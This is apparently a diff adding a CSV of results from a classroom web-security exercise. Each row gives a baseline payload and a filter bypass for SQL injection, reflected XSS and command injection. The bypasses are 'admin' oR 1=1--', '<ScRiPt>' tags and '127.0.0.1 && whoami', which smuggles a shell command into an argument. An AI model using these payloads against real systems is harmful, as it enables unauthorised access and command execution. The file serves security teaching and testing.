@@ -1,0 +1,4 @@
+vulnerability,family,owasp,baseline,bypass,medium_rule,bypass_method,oracle,baseline_blocked,bypass_passed_filter,confirmed,successes,trials,evidence
+SQL injection,sqli,A03:2021 Injection,admin' OR 1=1--,admin' oR 1=1--,case-sensitive ' OR ' check,mixed-case SQL keyword,admin canary appears in the response,True,True,True,2,2,marker 'FLAG-sqli-9f2c-admin-session' present
+Reflected XSS,xss,A03:2021 Injection,<script>alert('HW2-XSS')</script>,<ScRiPt>alert('HW2-XSS')</ScRiPt>,case-sensitive <script> check,mixed-case HTML tag,script element survives without HTML encoding,True,True,True,2,2,unescaped script element returned in HTML
+Command injection,cmdi,A03:2021 Injection,127.0.0.1; whoami,127.0.0.1 && whoami,semicolon-only shell check,alternate shell operator (&&),target reports that a shell metacharacter reached the command,True,True,True,2,2,ping -c 1 127.0.0.1 && whoami
